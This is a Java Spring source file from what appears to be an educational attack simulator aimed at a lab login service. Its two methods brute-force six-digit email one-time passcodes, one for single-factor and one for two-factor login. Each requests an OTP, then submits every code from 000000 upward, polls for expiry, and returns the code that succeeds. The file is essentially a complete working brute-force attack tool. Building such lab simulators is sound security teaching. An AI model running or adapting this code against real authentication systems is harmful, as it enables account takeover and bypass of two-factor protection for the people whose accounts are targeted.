
package com.example.attacksimulator.attack;

import org.springframework.stereotype.Component;

import com.example.attacksimulator.client.NewAuthLabLoginClient;
import com.example.attacksimulator.client.NewAuthLabLoginClient.LoginResult;
import com.example.attacksimulator.state.AttackState;

@Component
public class EmailOtpBruteForceAttack {

    private final NewAuthLabLoginClient newAuthLabLoginClient;

    private final AttackState attackState;

    public EmailOtpBruteForceAttack(
            NewAuthLabLoginClient newAuthLabLoginClient,
            AttackState attackState) {

        this.newAuthLabLoginClient = newAuthLabLoginClient;
        this.attackState = attackState;
    }

    // =========================================================
    // 一要素認証
    // Email OTP 総当たり攻撃
    // =========================================================

    /**
     * Email OTP 総当たり攻撃
     *
     * @param username 対象ユーザーのユーザー名
     * @param email 対象ユーザーのメールアドレス
     * @param maxAttempts 最大攻撃試行回数
     * @return 攻撃結果
     */
    public AttackResult execute(
            String username,
            String email,
            int maxAttempts) {

        if (username == null || username.isBlank()) {
            throw new IllegalArgumentException(
                    "ユーザー名が指定されていません。");
        }

        if (email == null || email.isBlank()) {
            throw new IllegalArgumentException(
                    "メールアドレスが指定されていません。");
        }

        if (maxAttempts <= 0) {
            throw new IllegalArgumentException(
                    "最大試行回数は1以上にしてください。");
        }

        // OTPは000000～999999の6桁
        int actualMaxAttempts =
                Math.min(maxAttempts, 1_000_000);

        System.out.println("========================================");
        System.out.println("Email OTP総当たり攻撃開始");
        System.out.println("username = " + username);
        System.out.println("email = " + email);
        System.out.println("最大試行回数 = " + actualMaxAttempts);
        System.out.println("========================================");

        // =====================================================
        // OTP発行
        // =====================================================

        LoginResult sendOtpResult =
                newAuthLabLoginClient.sendEmailOtp(
                        username,
                        email);

        if (!sendOtpResult.isRequestSuccess()) {

            System.out.println("OTP発行に失敗しました。");
            System.out.println(
                    "HTTP Status = " + sendOtpResult.getStatusCode());

            return new AttackResult(
                    false,
                    null,
                    0,
                    null);
        }

        System.out.println("newauthlabからOTPが発行されました。");

        // =====================================================
        // OTP総当たり
        // =====================================================

        int attemptCount = 0;

        attackState.setOtpTimedOut(false);

        // 最後に期限確認を行った時刻
        long lastExpirationCheck = 0;

        for (int i = 0; i < 1_000_000; i++) {

            // 停止ボタンなどによる割り込み確認
            if (Thread.currentThread().isInterrupted()) {
                System.out.println("総当たり攻撃を中断しました。");
                break;
            }

            if (attemptCount >= actualMaxAttempts) {
                break;
            }

            // =================================================
            // OTP有効期限確認（約1秒間隔）
            // =================================================

            long now = System.nanoTime();

            if (lastExpirationCheck == 0
                    || now - lastExpirationCheck >= 1_000_000_000L) {

                lastExpirationCheck = now;

                boolean expired =
                        newAuthLabLoginClient.checkOtpExpiration();

                // 通信中断の確認
                if (Thread.currentThread().isInterrupted()) {
                    System.out.println("OTP期限確認が中断されました。");
                    break;
                }

                // OTP期限切れ
                if (expired) {

                    attackState.setOtpTimedOut(true);

                    System.out.println("!!! TIME UP !!!");
                    System.out.println(
                            "OTPの有効期限切れにより攻撃を停止しました。");

                    break;
                }
            }

            // =================================================
            // OTP候補作成
            // =================================================

            String candidate =
                    String.format("%06d", i);

            attemptCount++;

            System.out.println(
                    "Email OTP総当たり 試行 "
                            + attemptCount
                            + " / "
                            + actualMaxAttempts
                            + " : "
                            + candidate);

            // =================================================
            // OTP検証
            // =================================================

            LoginResult verifyResult =
                    newAuthLabLoginClient.verifyEmailOtp(candidate);

            // 通信中断の確認
            if (Thread.currentThread().isInterrupted()) {
                System.out.println(
                        "OTP確認通信が中断されたため攻撃を停止します。");
                break;
            }

            // =================================================
            // 正解OTP発見
            // =================================================

            if (verifyResult.isSuccess()) {

                System.out.println("========================================");
                System.out.println("正解OTPを発見しました！");
                System.out.println("正解OTP = " + candidate);
                System.out.println("試行回数 = " + attemptCount);
                System.out.println("========================================");

                return new AttackResult(
                        true,
                        candidate,
                        attemptCount,
                        verifyResult);
            }
        }

        System.out.println("========================================");
        System.out.println("Email OTP総当たり攻撃終了");
        System.out.println("試行回数 = " + attemptCount);
        System.out.println(
                "タイムアウト = " + attackState.isOtpTimedOut());
        System.out.println("========================================");

        return new AttackResult(
                false,
                null,
                attemptCount,
                null);
    }

    // =========================================================
    // 二要素認証
    // Password → Email OTP 総当たり攻撃
    // =========================================================

    public AttackResult executeTwoFactor(
            String username,
            String password,
            int maxAttempts) {

        if (username == null || username.isBlank()) {
            throw new IllegalArgumentException(
                    "ユーザー名が指定されていません。");
        }

        if (password == null || password.isBlank()) {
            throw new IllegalArgumentException(
                    "パスワードが指定されていません。");
        }

        if (maxAttempts <= 0) {
            throw new IllegalArgumentException(
                    "最大試行回数は1以上にしてください。");
        }

        int actualMaxAttempts =
                Math.min(maxAttempts, 1_000_000);

        System.out.println("========================================");
        System.out.println("二要素認証 Email OTP総当たり攻撃開始");
        System.out.println("username = " + username);
        System.out.println("OTP最大試行回数 = " + actualMaxAttempts);
        System.out.println("========================================");

        // =====================================================
        // Password認証・OTP発行
        // =====================================================

        LoginResult passwordResult =
                newAuthLabLoginClient.loginTwoFactorPassword(
                        username,
                        password);

        if (!passwordResult.isRequestSuccess()) {

            System.out.println("Password認証に失敗しました。");

            return new AttackResult(
                    false,
                    null,
                    0,
                    passwordResult);
        }

        System.out.println("Password認証成功。");
        System.out.println("OTP発行を確認しました。");

        // =====================================================
        // OTP総当たり
        // =====================================================

        int attemptCount = 0;

        attackState.setOtpTimedOut(false);

        long lastExpirationCheck = 0;

        for (int i = 0; i < 1_000_000; i++) {

            // 停止ボタンによる割り込み確認
            if (Thread.currentThread().isInterrupted()) {
                System.out.println("総当たり攻撃を停止しました。");
                break;
            }

            if (attemptCount >= actualMaxAttempts) {
                break;
            }

            // =================================================
            // OTP有効期限確認（約1秒間隔）
            // =================================================

            long now = System.nanoTime();

            if (lastExpirationCheck == 0
                    || now - lastExpirationCheck >= 1_000_000_000L) {

                lastExpirationCheck = now;

                boolean expired =
                        newAuthLabLoginClient.checkOtpExpiration();

                if (Thread.currentThread().isInterrupted()) {
                    System.out.println("OTP期限確認が中断されました。");
                    break;
                }

                if (expired) {

                    attackState.setOtpTimedOut(true);

                    System.out.println("!!! TIME UP !!!");
                    System.out.println(
                            "OTPの有効期限切れにより攻撃を停止しました。");

                    break;
                }
            }

            // =================================================
            // OTP候補作成
            // =================================================

            String candidate =
                    String.format("%06d", i);

            attemptCount++;

            System.out.println(
                    "二要素Email OTP総当たり 試行 "
                            + attemptCount
                            + " / "
                            + actualMaxAttempts
                            + " : "
                            + candidate);

            // =================================================
            // OTP検証
            // =================================================

            LoginResult verifyResult =
                    newAuthLabLoginClient.verifyTwoFactorOtp(
                            candidate);

            if (Thread.currentThread().isInterrupted()) {
                System.out.println(
                        "OTP確認通信が中断されたため攻撃を停止します。");
                break;
            }

            // =================================================
            // 正解OTP発見
            // =================================================

            if (verifyResult.isSuccess()) {

                System.out.println("========================================");
                System.out.println("正解OTPを発見しました！");
                System.out.println("正解OTP = " + candidate);
                System.out.println("試行回数 = " + attemptCount);
                System.out.println("総当たり攻撃を終了します。");
                System.out.println("========================================");

                return new AttackResult(
                        true,
                        candidate,
                        attemptCount,
                        verifyResult);
            }
        }

        System.out.println("二要素OTP総当たり攻撃終了");
        System.out.println("試行回数 = " + attemptCount);
        System.out.println(
                "タイムアウト = " + attackState.isOtpTimedOut());

        return new AttackResult(
                false,
                null,
                attemptCount,
                null);
    }

    // =========================================================
    // Email OTP総当たり攻撃結果
    // =========================================================

    public static class AttackResult {

        private final boolean success;

        private final String otp;

        private final int attemptCount;

        private final LoginResult loginResult;

        public AttackResult(
                boolean success,
                String otp,
                int attemptCount,
                LoginResult loginResult) {

            this.success = success;
            this.otp = otp;
            this.attemptCount = attemptCount;
            this.loginResult = loginResult;
        }

        /**
         * 旧形式との互換用
         */
        public AttackResult(
                boolean success,
                String otp,
                int attemptCount) {

            this(
                    success,
                    otp,
                    attemptCount,
                    null);
        }

        public boolean isSuccess() {
            return success;
        }

        public String getOtp() {
            return otp;
        }

        public int getAttemptCount() {
            return attemptCount;
        }

        public LoginResult getLoginResult() {
            return loginResult;
        }
    }
}
